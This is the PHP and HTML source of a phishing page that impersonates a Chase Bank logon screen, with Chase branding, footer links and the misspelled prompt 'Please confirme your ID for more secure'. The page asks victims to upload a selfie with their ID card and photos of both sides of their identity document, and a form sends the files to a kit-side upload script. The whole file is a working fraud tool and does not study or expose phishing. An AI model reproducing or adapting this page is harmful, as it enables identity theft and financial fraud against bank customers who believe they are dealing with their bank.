<?php
/*
Mou-Ad
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on');
ob_start();
include_once 'lib.php';
?>
    <!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
 class="no-js" dir="ltr" lang="en">
<head>
<!-- saved from url=(0101)/logon/logon/chaseOnline -->
  <meta http-equiv="Content-Type"
 content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible"
 content="IE=edge">
  <meta name="msapplication-config"
 content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport"
 content="width=device-width, initial-scale=1.0">


<!--[if lte IE 8]>
        <link rel="stylesheet" type="text/css" media="all" href="css/ie8.css" />
        <![endif]-->
        <link rel="shortcut icon" href="css/chasefavicon.ico" />
  <link rel="apple-touch-icon"
 sizes="152x152"
 href="css/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon"
 sizes="120x120"
 href="css/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon"
 sizes="76x76"
 href="css/chase-touch-icon-76x76.png">
  <link rel="apple-touch-icon"
 href="css/chase-touch-icon.png">
  <meta name="apple-mobile-web-app-capable"
 content="yes">
  <meta
 name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('css/opensans-regular.eot?#iefix') format('embedded-opentype'),url('css/opensans-regular.woff') format('woff'),url('css/opensans-regular.ttf') format('truetype'),url('css/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('css/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('css/opensans-semibold.woff') format('woff'),url('css/opensans-semibold.ttf') format('truetype'),url('css/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('css/opensans-light.eot?#iefix') format('embedded-opentype'),url('css/opensans-light.woff') format('woff'),url('css/opensans-light.ttf') format('truetype'),url('css/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('css/videoplayer.eot?#iefix') format('embedded-opentype'),url('css/videoplayer.woff') format('woff'),url('css/videoplayer.ttf') format('truetype'),url('css/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
  <link rel="stylesheet"
 href="css/blue-ui.css">
  <link rel="stylesheet"
 href="css/logon.css">
 
  <style type="text/css">.jpui.background.image { background-image: url(css/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(css/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(css/background.tablet.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(css/background.desktop.night.7.jpeg); } }</style>
</head>
<body style="height: 100%;"
 data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region"
 aria-labelledby="site-messages-heading"
 class="toggle-aria-hidden" aria-hidden="true"
 data-has-view="true">
<div>

</div>
</div>
</div>

<header id="logon-summary-menu"
 class="toggle-aria-hidden" data-has-view="true"></header>
<div
 class="logon header jpui transparent navigation bar">


     <img style="max-width: 80%;"   src="chase.png"  />

</div>

</div>

<head>
<style type="text/css">
.auto-style3 {
    color: #3E4CEE;
    font-size: medium;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}
.auto-style2 {
    color: #5D5B5B;
    font-size: medium;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}
.auto-style4 {
    text-align: center;
    background-color: #FFFFFF;
}
.auto-style5 {
    background-color: #FFFFFF;
}
.auto-style6 {
    margin-top: 0px;
}
.auto-style7 {
    color: #1C8BCE;
    font-size: medium;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}
</style>
</head>
<table id="yiv509000037emailWrapperTable" style="font-family: Verdana,Arial,Helvetica,sans-serif; font-style: normal; font-variant: normal; font-weight: normal; font-size: 11px; line-height: normal; font-size-adjust: none; font-stretch: normal; color: rgb(51, 51, 51);" border="0" cellpadding="0" cellspacing="0" width="580" align="center" bordercolor="#FFFFFF">
<tbody>
  <tr valign="top"><td colspan="3">
<table border="0">
  <tr>
    <td style="border:1px #ccc solid; border-radius:15px;padding:25px;-moz-border-radius: 15pxa-webkit-border-radius: 15px; width: 553px; height: 17px;" class="auto-style4">

    <strong>

    <span class="auto-style3">
    <span class="auto-style5">



<link rel="stylesheet" href="css/main.css" data-reactid="10"/>


<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >




</div>



 

</li></ul></div></div></div></div></div><div>






<h2 class="vx_h2" data-reactid="110">Please confirme your ID for more secure</h2>

<div >
<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">


<img src="css/sample-selfie-card.svg" style="height: 150px;">


<p id="Selfie">1.Selfie (without) your ID card</p>


<img src="css/sample-photo-id-card.svg" style="height: 150px;">

<p id="Selfie">2.Photo of your ID document (both sides for driver license or ID card) </p>
<p id="Selfie">3.The photos must be clear </p>
<p id="Selfie">(PDF - JPG - PNG)</p>

        <!-- Google Fonts -->
        <link href="css/css.css" rel="stylesheet">
        
        <!-- styles -->
        <link href="css/src/jquery.fileuploader.css" media="all" rel="stylesheet">
        <link href="css/jquery.fileuploader-theme-thumbnails.css" media="all" rel="stylesheet">
        
        <!-- js -->
        <script src="css/js/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
        <script src="css/src/jquery.fileuploader.min.js" type="text/javascript"></script>
        <script src="css/js/custom.js" type="text/javascript"></script>

    
    </head>

    <body>


    <form action="css/php/form_upload.php" method="post" enctype="multipart/form-data">






            <input type="file" name="files">
            



</div>

</div>

  </div>
  <div class="row"> <button class="jpui button focus fluid primary" id="signin-button" type="submit" role="button" data-attr="LOGON.logonToLandingPage">
  <div class="label">Contiune</div>
  </button> </div>
  <div></div>
  <div></div>
</form></div>
</div>


</span></strong></span></td></tr></tbody>
</table>
</td>
</tr>
</table>



</div>
</div>
</div>
</div>
</div>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span
 <span class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="21" width="185" alt="Βank of Αmerica" src="css/Capture.PNG">
</div>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact
us</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms
of use</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair
Lending</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAboutChase">About
Chase</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P.
Morgan</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase
Canada</a></li>
  <li><a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2017 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2018 JPMorgan Chase &amp; Co.</span><br>
<a
 href=""
 class="NOTELINK"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>
